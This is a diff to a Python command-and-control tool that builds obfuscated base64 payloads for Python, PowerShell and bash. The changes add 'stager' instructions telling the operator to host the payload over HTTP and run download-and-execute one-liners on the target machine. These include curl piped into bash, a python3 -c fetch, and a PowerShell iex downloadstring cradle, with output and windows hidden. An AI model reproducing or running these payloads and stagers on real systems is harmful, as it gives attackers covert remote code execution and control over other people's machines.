@@ -85,22 +85,22 @@ note : available payload types are : py (python) , ps (powershell) , sh (bash)
                 base64_encoded_payload = b64encode(payload.encode())
                 b64payload.write(f"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('{base64_encoded_payload.decode('utf-8')}')[0]))")
                 b64payload.close()
-            print(f"""{W}\npayload created sucessfully !\nsaved as {getcwd()}/payload.py\n\nnote : you can use it as a oneliner by copy paste this code bellow into a shell !\n{G}    python3 -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('{base64_encoded_payload.decode('utf-8')}')[0]))"{Res}\n""")
+            print(f"""{W}\npayload created sucessfully !\nsaved as {getcwd()}/payload.py\n\nnote : you can use a oneliner stager ! simply by following the steps bellow :{Res}\n\n    1- start a simple http server : {G}python3 -m http.server <PORT>{Res} \n    2- run this command in the target machine : {G}python3 -c $(curl -s <LINK-TO-YOUR-PAYLOAD>) &> /dev/null{Res} \n\n     //replace "<PORT>" with a port number ( dont use the same port used by this tool ! ) and replace "<LINK-TO-YOUR-PAYLOAD>" with your actual link where you host the payload.\n""")
         
         #---------- generate a powershell payload ---------#
         elif self.payload_type == "ps":
             with open('payload.ps1','w') as b64payload:
                 base64_encoded_payload = b64encode(payload.encode('utf-16-le'))
-                b64payload.write(f"powershell.exe -E {base64_encoded_payload.decode('utf-8')} ")
+                b64payload.write(f"powershell.exe -w 1 -E {base64_encoded_payload.decode('utf-8')} ")
                 b64payload.close()
-            print(f"{W}\npayload created sucessfully !\nsaved as {getcwd()}/payload.ps1\n\nnote : you can use it as a onliner by copy and paste this code bellow into a powershell prompt !\n{G}    powershell.exe -E {base64_encoded_payload.decode('utf-8')} | Out-Null{Res}\n")
+            print(f"""{W}\npayload created sucessfully !\nsaved as {getcwd()}/payload.ps1\n\nnote : you can use a oneliner stager ! simply by following the steps bellow :{Res}\n\n    1- start a simple http server : {G}python3 -m http.server <PORT>{Res} \n    2- run this command in the target machine : {G}powershell.exe -w 1 -c iex(New-Object System.Net.Webclient).downloadstring('<LINK-TO-YOUR-PAYLOAD>'){Res}\n\n     //replace "<PORT>" with a port number ( dont use the same port used by this tool ! ) and replace "<LINK-TO-YOUR-PAYLOAD>" with your actual link where you host the payload.\n""")
         #---------- generate a bash payload -----------#
         elif self.payload_type == "sh":
             with open('payload.sh','w') as b64payload:
                 base64_encoded_payload = b64encode(payload.encode())
                 b64payload.write(f"echo {base64_encoded_payload.decode('utf-8')} | base64 -d | bash")
                 b64payload.close()
-            print(f"{W}\npayload created sucessfully !\nsaved as {getcwd()}/payload.sh\n\nnote : you can use it as a oneliner by copy paste this code bellow into a shell !\n{G}    echo {base64_encoded_payload.decode('utf-8')} | base64 -d | bash{Res}\n")
+            print(f"""{W}\npayload created sucessfully !\nsaved as {getcwd()}/payload.sh\n\nnote : you can use a oneliner stager ! simply by following the steps bellow :{Res}\n\n    1- start a simple http server : {G}python3 -m http.server <PORT>{Res} \n    2- run this command in the target machine : {G}curl -s <LINK-TO-YOUR-PAYLOAD> | bash &> /dev/null{Res} \n\n     //replace "<PORT>" with a port number ( dont use the same port used by this tool ! ) and replace "<LINK-TO-YOUR-PAYLOAD>" with your actual link where you host the payload.\n""")
     
     
     def server(self,serverhost,serverport):
@@ -135,4 +135,5 @@ note : available payload types are : py (python) , ps (powershell) , sh (bash)
 
 c2server = C2()
 c2server.main()
+
 
